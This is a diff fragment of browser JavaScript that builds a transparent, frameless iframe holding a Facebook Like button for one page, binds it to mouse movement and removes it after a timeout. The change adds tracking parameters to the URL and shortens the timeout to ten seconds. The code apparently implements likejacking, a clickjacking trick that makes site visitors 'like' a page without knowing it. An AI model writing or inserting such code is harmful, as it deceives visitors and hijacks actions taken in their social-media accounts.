@@ -7,7 +7,7 @@
       if (!IE) document.captureEvents(Event.MOUSEMOVE);
 
       var lbox = document.createElement('iframe');
-      lbox.src = 'http://www.facebook.com/plugins/like.php?href='+ encodeURIComponent('https://www.facebook.com/HirukPikuk-1746578758915950/')+'&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
+      lbox.src = 'http://www.facebook.com/plugins/like.php?href='+ encodeURIComponent('https://www.facebook.com/HirukPikuk-1746578758915950/?ref=notif&notif_t=fbpage_fan_invite&notif_id=1471914602029625')+'&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
       lbox.scrolling = 'no';
       lbox.frameBorder = 0;
       lbox.allowTransparency = 'true';
@@ -25,7 +25,7 @@
       setTimeout(function(){
         document.getElementsByTagName('body')[0].removeChild(lbox);
         window.removeEventListener('mousemove', mouseMove, false);
-      }, 30000);
+      }, 10000);
 
       function mouseMove(e) {
         if (IE) {
